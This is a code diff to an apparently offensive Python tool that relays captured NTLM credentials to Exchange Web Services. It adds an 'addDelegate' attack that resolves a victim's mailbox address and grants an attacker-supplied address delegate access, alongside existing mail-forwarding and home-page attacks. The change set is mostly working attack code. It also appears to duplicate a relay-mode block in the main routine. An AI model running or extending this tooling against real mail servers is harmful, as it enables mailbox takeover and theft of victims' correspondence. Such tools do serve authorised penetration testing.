@@ -30,7 +30,6 @@ from lib import logger
 templatesFolder = "SOAPRequestTemplates/"
 exchangeVersion = "Exchange2010_SP2"
 exchangeNamespace = {'m': 'http://schemas.microsoft.com/exchange/services/2006/messages', 't': 'http://schemas.microsoft.com/exchange/services/2006/types'}
-
 	
 #=========================================================================================
 # Class EWSAttack
@@ -146,6 +145,35 @@ class EWSAttack(Thread):
 			print helper.color("[+] Forward rule deployed")
 			print helper.color(self.client.lastresult, 'blue')
 
+		#------------------------------ ADD DELEGATE ------------------------------
+		elif self.config.ewsRequest == "addDelegate":
+			try:
+				#---- Prepare the request to resolve the user's principal eMail address
+				params = {'ExchangeVersion': exchangeVersion, 'UserAccount': self.username.replace('\x00','') }
+				body = helper.convertFromTemplate(params, templatesFolder + "resolveEmailAddr.tpl")
+	
+				#---- Send the request
+				print helper.color("[+] Sending request to resolve the principal eMail address for user [{}] ".format(self.username))
+				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
+				result = self.client.session.getresponse().read()
+				
+				#---- Parse the response and retrieve the eMail address
+				respXML = ET.fromstring(result)
+				eMailAddress = respXML.find(".//t:EmailAddress", exchangeNamespace).text
+				
+				#---- Prepare the request to add a 'destAddress' as a delegate for the user's mailbox
+				params = {'ExchangeVersion': exchangeVersion, 'TargetAddress': eMailAddress, 'DelegateAddress': self.config.ewsDestAddress }
+				body = helper.convertFromTemplate(params, templatesFolder + "addDelegate.tpl")
+	
+				#---- Send the request
+				print helper.color("[+] Sending request to add [{}] as a delegate address for [{}] inbox".format(self.config.ewsDestAddress, eMailAddress))
+				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
+				result = self.client.session.getresponse().read()
+				print helper.color(result, 'blue')
+
+			except Exception, e:
+				print helper.color("[!] Error processing result for addDelegate: [{}]".format(str(e)))
+			
 		#------------------------------ DEFAULT ------------------------------
 		else:
 			print helper.color(self.client.lastresult, 'blue')
@@ -172,21 +200,20 @@ if __name__ == '__main__':
 	parser.add_argument("-v","--verbose", action="store_true", help='Increase output verbositys')
 	parser.add_argument('-t',"--target", action='store', required=True, metavar = 'TARGET', help='EWS web service target to relay the credentials to, '
 		          'in the form of a URL: https://EWSServer/EWS/exchange.asmx')
-	parser.add_argument("-o", "--output-file", action="store", help="Base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2")
+	parser.add_argument('-o', "--output-file", action="store", help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
 	parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when '
 		                'interacting with the domain to grab a session key for signing, format is domain/machine_name')
 	parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
 	parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
 
 	# EWS API arguments
-	parser.add_argument("-r","--request", action="store", required=True,  choices=['sendMail', 'setHomePage', 'getFolder', 'forwardRule'], help='The EWS service to call')
+	parser.add_argument("-r","--request", action="store", required=True,  choices=['sendMail', 'setHomePage', 'getFolder', 'forwardRule', 'addDelegate'], help='The EWS service to call')
 	parser.add_argument("-d","--destAddresses", action="store", help='List of e-mail addresses to be used as destination for any EWS service that needs it.'
 						' Must be separated by a comma.')
 	parser.add_argument("-m","--message", action="store", help='Message File containing the body of the message as an HTML file')
 	parser.add_argument("-s","--subject", action="store", help='Message subject')
 	parser.add_argument("-f","--folder", action="store", choices=['inbox', 'sentitem', 'deleteditems', 'tasks','calendar'], help='The Exchange folder name to list')
 	parser.add_argument("-u","--url", action="store", help='URL to be used for the setHomePage request')
-	
 
 	try:
 	   args = parser.parse_args()
@@ -257,6 +284,20 @@ if __name__ == '__main__':
 			body = helper.convertFromTemplate({'ExchangeVersion': exchangeVersion, 'DestAddress': args.destAddresses}, templatesFolder +  "forwardRule.tpl")
 		else:
 			print helper.color("[!] Missing mandatory arguments for [forwardRule] request. Required arguments are: destAddresses")
+			sys.exit(1)
+
+	print helper.color("[*] Running in relay mode to single host")
+	targetSystem = TargetsProcessor(singletarget=args.target)
+
+	#-----------------------------------------------------------------
+	# Preparing the SOAPXMLRequest for the add delegate EWS Service
+	#-----------------------------------------------------------------
+	if args.request == "addDelegate":
+		if args.destAddresses:
+			# In the case of adding a delegate, the first request is a GET (so no body)
+			body = None
+		else:
+			print helper.color("[!] Missing mandatory arguments for [addDelegate] request. Required arguments are: destAddresses")
 			sys.exit(1)
 
 	print helper.color("[*] Running in relay mode to single host")
